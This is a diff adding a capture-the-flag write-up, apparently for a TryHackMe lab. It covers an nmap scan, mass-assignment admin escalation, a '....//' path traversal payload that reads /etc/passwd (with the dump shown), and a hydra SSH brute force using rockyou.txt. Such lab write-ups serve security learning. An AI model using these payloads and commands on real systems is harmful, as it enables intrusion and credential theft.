@@ -1,0 +1,105 @@
+# TASK Scan
+
+```
+root@ip-10-80-113-162:~# nmap 10.80.163.206 -sV -Pn -p- -T4
+Starting Nmap 7.80 ( https://nmap.org ) at 2025-12-23 09:49 GMT
+mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 10.80.163.206
+Host is up (0.0063s latency).
+Not shown: 65527 closed ports
+PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+25/tcp    open  smtp     Postfix smtpd
+110/tcp   open  pop3     Dovecot pop3d
+143/tcp   open  imap     Dovecot imapd (Ubuntu)
+993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
+995/tcp   open  ssl/pop3 Dovecot pop3d
+4000/tcp  open  http     Node.js (Express middleware)
+50000/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
+Service Info: Host:  mail.filepath.lab; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.30 seconds
+```
+
+---
+
+# TASK Find route/path and comments
+
+nikto, gobuster and ffuf does not guve useful info.
+Port 4000 and 50000 webpage soucre does not give useful info from comments.
+
+---
+
+# TASK Port 4000
+
+1. Navigate to port 4000 and log in with provided info on webpage.
+2. Add the `isAdmin` parameter to `true` in Profile tab.
+3. Go to the emerged API tab and paste the second provided GET Admins API in the Settings tab.
+4. Retrieve the username and password at Setting Tab for port 50000, through base64 decode.
+
+---
+
+# TASK Port 50000
+
+1. Login into System Monitoring (port 50000)
+2. Enter ....//....//....//....//....//....//....//....//....//....//etc/passwd at picture img path.
+3. 
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+tryhackme:x:1001:1001:,,,:/home/tryhackme:/bin/bash
+mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
+postfix:x:114:121::/var/spool/postfix:/usr/sbin/nologin
+dovecot:x:115:123:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
+dovenull:x:116:124:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
+joshua:x:1002:1002:,,,:/home/joshua:/bin/bash
+charles:x:1003:1003:,,,:/home/charles:/bin/bash
+```
+
+---
+
+# TASK ssh
+
+1. Add joshua and charlesinto user.txt
+2. hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ssh://10.80.163.206
+3. Both password 123456
+4. cat /var/www/html/505eb0fb8a9f32853b4d955e1f9123ea.txt
+
+---
+
+# Appendix
